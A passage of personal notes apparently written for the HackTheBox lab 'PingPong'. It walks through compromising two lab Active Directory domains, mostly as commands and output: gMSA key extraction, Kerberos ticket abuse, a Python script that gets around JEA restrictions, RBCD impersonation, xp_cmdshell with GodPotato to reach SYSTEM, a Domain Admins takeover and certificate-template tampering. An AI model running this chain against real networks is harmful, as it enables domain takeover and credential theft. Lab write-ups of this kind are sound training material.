- Then (also adding to /etc/hosts) we can shift gMSA Manager context to local domain:
```
faketime "+8hours" bloodyAD -k --host dc2.pong.htb -d pong.htb -u 'c.roberts@PING.HTB' \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483640
[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/HTB/Active/PingPong]
└─$ faketime "+8hours" bloodyAD -k --host dc2.pong.htb -d pong.htb -u 'c.roberts@PING.HTB' \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483644
[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/HTB/Active/PingPong]
└─$ faketime "+8hours" bloodyAD -k --host dc2.pong.htb -d pong.htb -u 'c.roberts@PING.HTB' \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483644
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/HTB/Active/PingPong]
└─$ faketime "+8hours" bloodyAD -u c.roberts@ping.htb -d pong.htb -k \
  --host dc2.pong.htb --dc-ip 192.168.2.2 \
  add genericAll "CN=gMSA Managers,CN=Users,DC=pong,DC=htb" \
  "S-1-5-21-750635624-2058721901-1932338391-2617"
[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on CN=gMSA Managers,CN=Users,DC=pong,DC=htb

faketime "+8hours" bloodyAD -k --host dc2.pong.htb -d pong.htb -u 'c.roberts@PING.HTB' \
  add groupMember 'gMSA Managers' 'S-1-5-21-750635624-2058721901-1932338391-2617'
[+] S-1-5-21-750635624-2058721901-1932338391-2617 added to gMSA Managers
```
![[Pasted image 20260427194312.png]]
![[Pasted image 20260427200918.png]]
- Now I need to request a ticket to access pong.htb :
```
faketime "+8hours" impacket-getST \
  -k -no-pass \
  -spn krbtgt/PONG.HTB \
  -dc-ip 10.129.40.41 \ 
  ping.htb/c.roberts
  
---OUTPUT---
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in c.roberts@krbtgt_PONG.HTB@PING.HTB.ccache
```

- I change the ccache name to a more clear one and export it:
```
mv c.roberts@krbtgt_PONG.HTB@PING.HTB.ccache crobst.ccache

export KRB5CCNAME=crobst.ccache
```
- I then searched for gMSA in pong :
```
faketime "+8hours" bloodyAD -k --host dc2.pong.htb -d pong.htb -u 'c.roberts@PING.HTB' \
  get search --filter '(objectClass=msDS-GroupManagedServiceAccount)' --attr sAMAccountName

distinguishedName: CN=Pong_gMSA,CN=Managed Service Accounts,DC=pong,DC=htb
sAMAccountName: Pong_gMSA$
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/HTB/Active/PingPong]
└─$ faketime "+8hours" bloodyAD -k --host dc2.pong.htb -d pong.htb -u 'c.roberts@PING.HTB' \           
  get object 'Pong_gMSA$' --attr msDS-ManagedPassword

distinguishedName: CN=Pong_gMSA,CN=Managed Service Accounts,DC=pong,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:4b85a2a049588810c1267e4018b07a07
msDS-ManagedPassword.B64ENCODED: eFkbWLHQ9ZrAkNUPkIoyBnuGsnXyZOPO5eNOWWlCXuW+gcHc8jj3TpS1td5uZu2q3PoJBjL68DchzLF7DRcebEPpqm2SigCrJiwtO/C+RMfgVtphZX8BTmckbsUG2dDbiSLW6gj1jMN8Z9oMmpcbSuAshl5uZU2iCIOBdo3rinaX28jwCTKhkaELO+V+CLmoOfRJ2bYjL8V1QzJssh0/RuiaQ+bRLMasy8cLZ24mZhf3/4akKyRSn39X3E+RT7DEc7xHrxBVevTGTsIeD/3OfzMXs5ZW3fc0Iiut/d4heHjhkIfZhsmDQaZmGq4BMi+rG4HY+6gBkNyvHk3rRa9ozQ==

```

- I was unable to extract AES key from blob tso used another command:
```
faketime "+8hours" ldeep ldap -d "pong.htb" -s "192.168.2.2" -k gmsa -t 'Pong_gMSA$'
Pong_gMSA$:nthash:4b85a2a049588810c1267e4018b07a07
Pong_gMSA$:aes128-cts-hmac-sha1-96:c48ae0b9895ebd9e1fe44ce34d3b696e
Pong_gMSA$:aes256-cts-hmac-sha1-96:9a3d021763ac0f2ceb3b629eddf92fee758a3ba6fce28269a2d35a3e252e539a
Pong_gMSA$:reader:gMSA Managers (group)
```

- Using this I get Pong tgt

```
faketime "+8hours" impacket-getTGT -aesKey '9a3d021763ac0f2ceb3b629eddf92fee758a3ba6fce28269a2d35a3e252e539a' -dc-ip 192.168.2.2 pong.htb/'Pong_gMSA$'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Pong_gMSA$.ccache
```

```
mv Pong_gMSA$.ccache Pong_gMSA.ccache
export KRB5CCNAME=Pong_gMSA.ccache
```

- Furthermore earlier when  getting the description of Pong_gMSA we see it has JEA orivileges on dc1:
```
faketime "+8hours" bloodyAD -k --host dc2.pong.htb -d pong.htb -u 'c.roberts@PING.HTB' \           
  get object 'Pong_gMSA$' --attr description

distinguishedName: CN=Pong_gMSA,CN=Managed Service Accounts,DC=pong,DC=htb
description: JEA Enabled gMSA on DC1
                                    
```
![[Pasted image 20260429105915.png]]

- Now using this we can bring `gMSA Managers` back to ping.htb context and using the service Ticket from Pong.htb once readded to gMSA Managers we can grab the aes key for gMSA$ in ping.htb

- First we remove all users as we cant change grouptype back when users across domains exist in it.
```
export KRB5CCNAME=crobst.ccache

faketime "+8hours" bloodyAD -k --host dc2.pong.htb -d pong.htb -u 'c.roberts@PING.HTB' \
  remove groupMember 'gMSA Managers' 'S-1-5-21-750635624-2058721901-1932338391-2617'
[-] S-1-5-21-750635624-2058721901-1932338391-2617 removed from gMSA Managers
  

faketime "+8hours" bloodyAD -k --host dc2.pong.htb -d pong.htb -u 'c.roberts@PING.HTB' \
  remove groupMember 'gMSA Managers' 'Pong_gMSA$'
[-] Pong_gMSA$ removed from gMSA Managers
```

- Then we switch context back:
```
faketime "+8hours" bloodyAD -k --host dc2.pong.htb -d pong.htb -u 'c.roberts@PING.HTB' \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483640
[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated


faketime "+8hours" bloodyAD -k --host dc2.pong.htb -d pong.htb -u 'c.roberts@PING.HTB' \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483646
[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated
```
(not sure if second comand is needed)

- We add the users back:
```
faketime "+8hours" bloodyAD -k --host dc2.pong.htb -d pong.htb -u 'c.roberts@PING.HTB' \
  add groupMember 'gMSA Managers' 'Pong_gMSA$'
[+] Pong_gMSA$ added to gMSA Managers


```

- We give Generic All to `Pong-gMSA$`
```
faketime "+8hours" bloodyAD -u c.roberts@ping.htb -d pong.htb -k \
  --host dc2.pong.htb --dc-ip 192.168.2.2 \                                     
  add genericAll "CN=gMSA Managers,CN=Users,DC=pong,DC=htb" \
  "S-1-5-21-2410575906-3092493790-2123333151-1123"
[+] S-1-5-21-2410575906-3092493790-2123333151-1123 has now GenericAll on CN=gMSA Managers,CN=Users,DC=pong,DC=htb
```

- Then we can generate a service ticket to access ping.htb as `Pong_gMSA$`:
```
export KRB5CCNAME=Pong_gMSA\$.ccache                                                                                                                  
faketime "+8hours" impacket-getST \ 
  -k -no-pass \
  -spn krbtgt/PING.HTB \
  -dc-ip 192.168.2.2 \
  pong.htb/'Pong_gMSA$'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in Pong_gMSA$@krbtgt_PING.HTB@PONG.HTB.ccache
```

- Change name to more readable without special characters:
```
mv Pong_gMSA\$@krbtgt_PING.HTB@PONG.HTB.ccache Pong_gMSAST.ccache
```

- Now with this service ticket we can grab the Aes key for `gMSA$` in ping.htb:
```
export KRB5CCNAME=Pong_gMSAST.ccache                             


faketime "+8hours" bloodyAD -k --host dc1.ping.htb -d ping.htb \ 
  -u 'Pong_gMSA$@PONG.HTB' \
  get object 'GMSA$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA,CN=Managed Service Accounts,DC=ping,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:f1ddc2e3df88c9d122f095e3513109ae
msDS-ManagedPassword.B64ENCODED: ROT/Sj7hT5XfFUIW3DnBcWTRGtu7IKHslAqtObJlZIVVWjToAZuJFTuLdYLRIrlJ7YBjnit888G34NtI1OZ6N1g1ib7OHS8LBmKFsAV6AKEwFU8kob5lM0iaXmybHkLpmvWtSo2Iw8G6AqF0beT1L65fR4m53XUQ4YHCPxbh8Uaxy3Yiu9qR5Xh0U9drF8YPSN7MbYC+Mz5HFsrWGcFU4HabvCcqAf0vFxL4TqcM/7sSpQIkqY0uFjVC12Y1WpyxiWO0+KdgL7+5J0kwLj3G2lpEFmT7Z56VuBDru7KG5kpiJRdeY/k4JC9hUcQc/BDKPwuN9BBDtnVtNEnVVdnLhA==
```

- As I was unable to get AES key with python script I used ldeep again:
```
faketime "+8hours" ldeep ldap -d "dc1.ping.htb" -s "ping.htb" -k gmsa -t 'gMSA$'     
gMSA$:nthash:f1ddc2e3df88c9d122f095e3513109ae
gMSA$:aes128-cts-hmac-sha1-96:2c884bc528ba260bd96d6d77d90086d8
gMSA$:aes256-cts-hmac-sha1-96:182e34f73536c34dc0b9b6e4ce68f0a3dfc7aab9d5f659fb1e86744c6cb14b31
gMSA$:reader:S-1-5-21-2410575906-3092493790-2123333151-1104
```

- Using this I can generate a TGT for gMSA$:
```
faketime "+8hours" impacket-getTGT -aesKey '182e34f73536c34dc0b9b6e4ce68f0a3dfc7aab9d5f659fb1e86744c6cb14b31' -dc-ip 10.129.43.72 ping.htb/'gMSA$'    
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in gMSA$.ccache
```

### Back to JEA
- Now we have compromised both Ping and Pong gMSA accounts. we need an HTTP ticket to bypass JEA restrictions:
- First I get a service ticket for gMSA$ for pong.htb:
```
export KRB5CCNAME=gMSA\$.ccache


faketime "+8hours" impacket-getST \
  -k -no-pass \
  -spn krbtgt/PONG.HTB \
  -dc-ip 10.129.43.72 \
  ping.htb/'gMSA$'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in gMSA$@krbtgt_PONG.HTB@PING.HTB.ccache
```
- Changing the name:
```
mv gMSA\$@krbtgt_PONG.HTB@PING.HTB.ccache gmsaPongST.ccache
```

- Then using this Service ticket and generate another service ticket as Pong with a HTTP spn as HTTP bypasses restrictions:
```
export KRB5CCNAME=Pong_gMSAST.ccache

faketime "+8hours" impacket-getST \
  -k -no-pass \
  -spn HTTP/dc1.ping.htb \
  -dc-ip 10.129.43.72 \
  ping.htb/'Pong_gMSA$'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in Pong_gMSA$@HTTP_dc1.ping.htb@PING.HTB.ccache
```

- I rename it:
```
mv Pong_gMSA\$@HTTP_dc1.ping.htb@PING.HTB.ccache Pong_gMSAHTTP.ccache
```

- Finally I merge the two ST
```
python3 - << 'EOF'
from impacket.krb5.ccache import CCache
tgt = CCache.loadFile('Pong_gMSA$.ccache')
st = CCache.loadFile('Pong_gMSAHTTP.ccache')
for cred in st.credentials:
    tgt.credentials.append(cred)
tgt.saveFile('PongFull.ccache')
print('Done')
EOF
Done
```

- Then after a lot of testing and playing around with pypsrc..first checking Get-Command to see all commands. Then bypassing restrictions by :
```
JEA commonly enforces restrictions by:

inspecting the command line surface
filtering allowed cmdlets at invocation time
exposing only proxy functions

But:

👉 When PowerShell executes a user-defined function, the JEA enforcement layer sees:

function f

not:

Get-Content

So the restricted cmdlet is:

not blocked at parse/visibility level
executed inside the allowed execution context

That’s the key idea.
```

- So with this final exploit i managed to read contents:
```
cat findpshistory.py

---OUTPUT---
import os

os.environ['KRB5CCNAME'] = 'PongFull.ccache'

from pypsrp.wsman import WSMan
from pypsrp.powershell import RunspacePool, PowerShell

wsman = WSMan(
    server="dc1.ping.htb",
    auth="kerberos",
    ssl=False,
    cert_validation=False,
)

with RunspacePool(wsman, configuration_name="restricted") as pool:

    ps = PowerShell(pool)

    ps.add_script(r'''
function f {
    Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" |
    Out-String
}

f
''')

    ps.invoke()

    print("\n=== OUTPUT ===")
    for o in ps.output:
        print(repr(o))
        print(str(o))

    print("\n=== ERRORS ===")
    for e in ps.streams.error:
        try:
            print("Message:", e.message)
        except:
            pass
```

- I run the code and get the following output:
```
faketime "+8hours" python3 findpshistory.py 

=== OUTPUT ===
'ls\r\nls -force\r\nhostname\r\nwhoami\r\nwhoami /all\r\nGet-ExecutionPolicy\r\nSet-ExecutionPolicy RemoteSigned -Scope CurrentUser\r\nGet-Help Get-Process\r\nGet-Process\r\nGet-Process | Sort-Object CPU -Descending\r\nGet-Service\r\nGet-Service | Where-Object Status -eq "Running"\r\nGet-Service | Where-Object StartType -eq "Automatic"\r\ngci\r\ngci C:\\\r\nGetchilditem \\Windows\r\nSet-Location C:\\Users\\\r\nls\r\ncd.\\Public\r\nls\r\ncd C:\\\r\ngic -Recurse -ErrorAction SilentlyContinue\r\ngci -Recurse -ErrorAction SilentlyContinue\r\nGet-ChildItem -Filter *.log\r\nGet-ChildItem -Recurse -Include *.txt\r\nClear-Host\r\nGet-Command\r\nGet-Command *service*\r\nGet-Command *process*\r\nGet-CimInstance Win32_OperatingSystem\r\nGet-CimInstance Win32_ComputerSystem\r\nGet-CimInstance Win32_Process\r\nGet-CimInstance Win32_LogicalDisk\r\nGet-CimInstance Win32_BIOS\r\nGet-Alias\r\nGet-History\r\nipconfig\r\nipconfig /all\r\nping google.com\r\nnetstat -ano\r\nTest-NetConnection google.com\r\nTest-NetConnection google.com -Port 443\r\nGet-DnsClientServerAddress\r\nSet-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 8.8.8.8\r\ntasklist\r\ntasklist /v\r\nls\r\nls -force\r\nGet-Process explorer\r\nGet-EventLog -LogName System -Newest 20\r\nGet-EventLog -LogName Application -Newest 20\r\nGet-WinEvent -LogName Security -MaxEvents 10\r\nClear-EventLog -LogName Application\r\n$env:Path\r\nGet-PSDrive\r\nGet-PSProvider\r\nGet-\r\nGet-Module -ListAvailable\r\nImport-Module ActiveDirectory\r\nGet-ADDomain\r\nGet-ADUser -Filter *\r\nGet-ADUser -Identity Administrator\r\nGet-ADGroup -Filter * -Server pong.htb\r\nGetadgroup\r\nGet-adgroup "remote management users" -server pong.htb\r\n$c = New-object System.management.automation.pscredential("pong\\c.carlssen,$(convertto-securestring -asplaintext -force "A()DUJ!@414"))\r\nEnter-pssession -computername dc2.pong.htb -credential $c\r\nGet-ADComputer -Filter *\r\nGet-ADUser -Filter * | Select-Object Name\r\nGet-ADUser -Filter * | Export-Csv users.csv -NoTypeInformation\r\nImport-Csv users.csv\r\ngc -raw users.csv\r\ncd C:\\Temp\r\nCopy-Item users.csv backup_users.csv\r\nMove-Item backup_users.csv archive_users.csv\r\nrm -f *.csv\r\nGet-ScheduledTask\r\nGet-ScheduledTask | Where-Object State -eq "Ready"\r\nRestart-Service spooler\r\nStop-Service spooler\r\nStart-Service spooler\r\nSet-Service spooler -StartupType Automatic\r\nGet-Service spooler\r\nGet-Process powershell\r\nGet-Process pwsh\r\n$PSVersionTable\r\nGet-Host\r\nClear-History\r\nGet-History\r\nMeasure-Command { Get-Process }\r\nForEach ($i in 1..10) { Write-Output $i }\r\n1..10 | ForEach-Object { $_ * 2 }\r\n1..10 | Where-Object { $_ -gt 5 }\r\n$numbers = 1..100\r\n$numbers | Measure-Object -Sum\r\n$numbers | Measure-Object -Average\r\n$numbers | Sort-Object -Descending\r\n$numbers | Select-Object -First 10\r\nGet-ChildItem HKLM:\\Software\r\nGet-ChildItem HKCU:\\Software\r\nGet-Command -Module Microsoft.PowerShell.Management\r\nSave-Help -DestinationPath C:\\Help\r\nGet-PSReadLineOption\r\nSet-PSReadLineOption -PredictionSource History\r\nClear-Host\r\niwr -useb https://github.com/fleschutz/PowerShell/blob/main/scripts/play-mission-impossible.ps1\r\n\r\nExit\r\n'
ls
ls -force
hostname
whoami
whoami /all
Get-ExecutionPolicy
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
Get-Help Get-Process
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
gci
gci C:\
Getchilditem \Windows
Set-Location C:\Users\
ls
cd.\Public
ls
cd C:\
gic -Recurse -ErrorAction SilentlyContinue
gci -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Filter *.log
Get-ChildItem -Recurse -Include *.txt
Clear-Host
Get-Command
Get-Command *service*
Get-Command *process*
Get-CimInstance Win32_OperatingSystem
Get-CimInstance Win32_ComputerSystem
Get-CimInstance Win32_Process
Get-CimInstance Win32_LogicalDisk
Get-CimInstance Win32_BIOS
Get-Alias
Get-History
ipconfig
ipconfig /all
ping google.com
netstat -ano
Test-NetConnection google.com
Test-NetConnection google.com -Port 443
Get-DnsClientServerAddress
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 8.8.8.8
tasklist
tasklist /v
ls
ls -force
Get-Process explorer
Get-EventLog -LogName System -Newest 20
Get-EventLog -LogName Application -Newest 20
Get-WinEvent -LogName Security -MaxEvents 10
Clear-EventLog -LogName Application
$env:Path
Get-PSDrive
Get-PSProvider
Get-
Get-Module -ListAvailable
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter *
Get-ADUser -Identity Administrator
Get-ADGroup -Filter * -Server pong.htb
Getadgroup
Get-adgroup "remote management users" -server pong.htb
$c = New-object System.management.automation.pscredential("pong\c.carlssen,$(convertto-securestring -asplaintext -force "A()DUJ!@414"))
Enter-pssession -computername dc2.pong.htb -credential $c
Get-ADComputer -Filter *
Get-ADUser -Filter * | Select-Object Name
Get-ADUser -Filter * | Export-Csv users.csv -NoTypeInformation
Import-Csv users.csv
gc -raw users.csv
cd C:\Temp
Copy-Item users.csv backup_users.csv
Move-Item backup_users.csv archive_users.csv
rm -f *.csv
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"
Restart-Service spooler
Stop-Service spooler
Start-Service spooler
Set-Service spooler -StartupType Automatic
Get-Service spooler
Get-Process powershell
Get-Process pwsh
$PSVersionTable
Get-Host
Clear-History
Get-History
Measure-Command { Get-Process }
ForEach ($i in 1..10) { Write-Output $i }
1..10 | ForEach-Object { $_ * 2 }
1..10 | Where-Object { $_ -gt 5 }
$numbers = 1..100
$numbers | Measure-Object -Sum
$numbers | Measure-Object -Average
$numbers | Sort-Object -Descending
$numbers | Select-Object -First 10
Get-ChildItem HKLM:\Software
Get-ChildItem HKCU:\Software
Get-Command -Module Microsoft.PowerShell.Management
Save-Help -DestinationPath C:\Help
Get-PSReadLineOption
Set-PSReadLineOption -PredictionSource History
Clear-Host
iwr -useb https://github.com/fleschutz/PowerShell/blob/main/scripts/play-mission-impossible.ps1

Exit
```

- From here we can see credentials for a user `c.carlssen`: `A()DUJ!@414`

- I register a kerberos ticket for it for Pong.htb:
```
kinit C.Carlssen@PONG.HTB

A()DUJ!@414
```

- I can confirm with:
```
klist                    
Ticket cache: FILE:Pong_gMSAST.ccache
Default principal: c.carlssen@PONG.HTB

Valid starting       Expires              Service principal
04/30/2026 16:02:48  05/01/2026 02:02:48  krbtgt/PONG.HTB@PONG.HTB
        renew until 05/01/2026 16:02:37
```

![[Pasted image 20260430080332.png]]

- I can now access pong dc and grab user flag:
```
evil-winrm -i dc2.pong.htb -r pong.htb
```
![[Pasted image 20260430080459.png]]

- I grab the user flag:
![[Pasted image 20260430080638.png]]

- Checking write privileges :
```
faketime "+8hours" bloodyAD -u c.carlssen -d pong.htb -k --host dc2.pong.htb get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=C.Carlssen,CN=Users,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=svc_sql,OU=Service Accounts,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=svc_print,OU=Service Accounts,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=svc_ldap,OU=Service Accounts,DC=pong,DC=htb
permission: WRITE

distinguishedName: DC=pong.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=pong,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.pong.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=pong,DC=htb
permission: CREATE_CHILD
```

- sql_svc sounds interested and we have write privileges on it. We can attempt RBCD on it:
- But we see machine account quota is 0 so we can't:
```
faketime "+8hours" bloodyAD -u c.carlssen -d pong.htb -k --host dc2.pong.htb get object "DC=pong,DC=htb" --attr ms-DS-MachineAccountQuota

distinguishedName: DC=pong,DC=htb
ms-DS-MachineAccountQuota: 0
```
![[Pasted image 20260430082216.png]]

- We do have control over Pong_gMSA though so lets add Pong_gMSA to be trusted by sql_svc:
```
(WITH C.CARLSSEN IN KILIST)


faketime "+8hours" bloodyAD -k -d pong.htb -u c.carlssen --host dc2.pong.htb add rbcd svc_sql 'Pong_gMSA$'
[!] No security descriptor has been returned, a new one will be created
[+] Pong_gMSA$ can now impersonate users on svc_sql via S4U2Proxy)
```
- Then I can act as Pong-GMSA and impersonate c.adam:
```
export KRB5CCNAME=PongFull.ccache

faketime "+8hours" impacket-getST -spn mssqlsvc/dc2.pong.htb -impersonate c.adam -k -no-pass pong.htb/'Pong_gMSA$'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating c.adam
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in c.adam@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache
```

- Why c.adam? If we check groups in c.carlssen session:
```
net groups /domain

---OUTPUT---
Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*Database Admins
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*gMSA Managers
*Group Policy Creator Owners
*IT Service Admins
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
The command completed with one or more errors.
```

- We can check members of database admin:
```
net group "Database Admins" /domain

---OUTPUT---
Group name     Database Admins
Comment

Members

-------------------------------------------------------------------------------
C.Adam                   P.Reiner
The command completed successfully.

```

- Using this ccache I can acces mssql:
```
export KRB5CCNAME=c.adam@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache

faketime "+8hours" ~/.local/share/pipx/venvs/impacket/bin/mssqlclient.py -k -no-pass -target-ip 192.168.2.2 'PONG.HTB/c.adam@dc2.pong.htb'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC2): Line 1: Changed database context to 'master'.
[*] INFO(DC2): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (pong\C.Adam  dbo@master)> 

```

- enable xp_cmdshell:
```
enable_xp_cmdshell
RECONFIGURE;
```
- Looking at privileges I have SeImpesonate privilege:
```
EXEC xp_cmdshell 'whoami /priv"';
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeMachineAccountPrivilege     Add workstations to domain                Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
NULL                                                                               
SQL (pong\C.Adam  dbo@master)> EXEC xp_cmdshell 'whoami"';
output         
------------   
pong\svc_sql   
NULL
```

- In my `c.carlssen` winrm session I upload GodpOtato and run it from sql_svc as `nt authority/system`. As i cant reach my machine I can make c.carlssen admin instead:
![[Pasted image 20260430100040.png]]
```
EXEC xp_cmdshell 'C:\ProgramData\gp.exe -cmd "net localgroup administrators c.carlssen /add"';

---OUTPUT---
output                                                                                   
--------------------------------------------------------------------------------------   
[*] CombaseModule: 0x140732959883264                                                     
[*] DispatchTable: 0x140732962470216                                                     
[*] UseProtseqFunction: 0x140732961762848                                                
[*] UseProtseqFunctionParamCount: 6                                                      
[*] HookRPC                                                                              
[*] Start PipeServer                                                                     
[*] CreateNamedPipe \\.\pipe\b16d3293-1eed-4cb3-b206-b1b413ae1fbd\pipe\epmapper          
[*] Trigger RPCSS                                                                        
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                                  
[*] DCOM obj IPID: 00006402-0c18-ffff-54d2-5da05ae7b2c1                                  
[*] DCOM obj OXID: 0x633c6d56ca71a104                                                    
[*] DCOM obj OID: 0x2674cf424822c09e                                                     
[*] DCOM obj Flags: 0x281                                                                
[*] DCOM obj PublicRefs: 0x0                                                             
[*] Marshal Object bytes len: 100                                                        
[*] UnMarshal Object                                                                     
[*] Pipe Connected!                                                                      
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE                                            
[*] CurrentsImpersonationLevel: Impersonation                                            
[*] Start Search System Token                                                            
[*] PID : 900 Token:0x752  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation   
[*] Find System Token : True                                                             
[*] UnmarshalObject: 0x80070776                                                          
[*] CurrentUser: NT AUTHORITY\SYSTEM                                                     
[*] process start with pid 2844                                                          
The command completed successfully.                                                      
NULL                                                                                     
NULL                  
```

- Can check via the command:
```
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
C.Carlssen
Domain Admins
Enterprise Admins
The command completed successfully.
```

![[Pasted image 20260430100322.png]]
- I can now add myself to the Domain Admins (C.carlssen) with the kinit as c.carlssen:
```
faketime "+8hours" bloodyAD -k -d pong.htb -u C.Carlssen --host dc2.pong.htb \ 
  add groupMember 'CN=Domain Admins,CN=Users,DC=pong,DC=htb' 'C.Carlssen'
[+] C.Carlssen added to CN=Domain Admins,CN=Users,DC=pong,DC=htb
```
![[Pasted image 20260430110323.png]]

- If I pass the get writeable commadn from bloody ad I see Domain Admins is writeable:
```
faketime "+8hours" bloodyAD -u c.carlssen -d pong.htb -k --host dc2.pong.htb get writable
---RELEVANT-OUTPUT---
distinguishedName: CN=Domain Admins,CN=Users,DC=pong,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
SACL: WRITE
```

- In Bloodhound if we checked CA Manager members we see a user from Pong.htb:
![[Pasted image 20260430111830.png]]

- Looking at R.Martinelli's SID :
```
Get-ADUser -Identity R.Martinelli

--OR--
Get-ADUser -Filter "objectSid -eq 'S-1-5-21-2410575906-3092493790-2123333151-1124'"

---OUTPUT---
DistinguishedName : CN=R.Martinelli,CN=Users,DC=pong,DC=htb
Enabled           : True
GivenName         :
Name              : R.Martinelli
ObjectClass       : user
ObjectGUID        : 0e8d00d5-bc2b-495c-8253-d921ad303ca8
SamAccountName    : R.Martinelli
SID               : S-1-5-21-2410575906-3092493790-2123333151-1124
Surname           :
UserPrincipalName :

```
![[Pasted image 20260430112004.png]]

- We change the password for this user:
```
faketime "+8hours" bloodyAD -k -d pong.htb -u C.Carlssen --host dc2.pong.htb \
  set password 'R.Martinelli' 'PleaseEndThis!23'
[+] Password changed successfully!
```
![[Pasted image 20260430112209.png]]

- I authenticate with kinit:
![[Pasted image 20260430112303.png]]
```
kinit R.Martinelli@PONG.HTB
> PleaseEndThis!23
```
![[Pasted image 20260430112339.png]]

- Using ldapmodify I can change the attribtue to 1:
```
ldapmodify -H ldap://dc1.ping.htb -Y GSSAPI << 'EOF'
dn: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
changetype: modify
replace: msPKI-Certificate-Name-Flag
msPKI-Certificate-Name-Flag: 1
EOF
SASL/GSSAPI authentication started
SASL username: R.Martinelli@PONG.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb"

```
![[Pasted image 20260430115046.png]]

- I add c.roberts with generic all privileges on smartcard authenticators:
```
faketime "+8hours" bloodyAD -k --host dc1.ping.htb -d ping.htb -u 'R.Martinelli@PONG.HTB' \
  add genericAll 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \ 
  'S-1-5-21-750635624-2058721901-1932338391-2617'
[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
```
![[Pasted image 20260430113517.png]]

![[Pasted image 20260430114418.png]]

